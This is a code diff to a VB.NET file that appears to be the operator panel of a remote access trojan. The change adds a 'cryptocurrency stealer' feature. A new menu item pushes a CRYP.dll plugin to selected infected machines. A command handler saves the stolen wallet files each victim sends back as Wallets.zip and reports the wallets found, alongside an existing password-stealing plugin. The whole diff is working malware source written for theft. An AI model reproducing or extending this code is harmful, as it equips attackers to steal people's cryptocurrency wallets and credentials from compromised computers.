@@ -761,6 +761,13 @@ Public Class Main
 
 #End Region
 
+#Region "Crypto"
+
+                Case "CRYP"
+                    IO.File.WriteAllBytes(uFolder(A(1), "Wallets.zip"), Convert.FromBase64String(A(2)))
+                    Messages(u.IP.Split(":")(0), "Found Wallets: " + A(3))
+#End Region
+
 #Region "Send Plugin"
                 Case "GPL"
                     Dim Folderx = IO.Directory.GetFiles(Application.StartupPath & "\Misc\Plugins")
@@ -1172,6 +1179,17 @@ Public Class Main
         Try
             For Each x As ListViewItem In L1.SelectedItems
                 S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
+
+    Private Sub CryptocurrencyStealerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CryptocurrencyStealerToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\CRYP.dll")))
             Next
         Catch ex As Exception
             MsgBox(ex.Message, MsgBoxStyle.Critical)
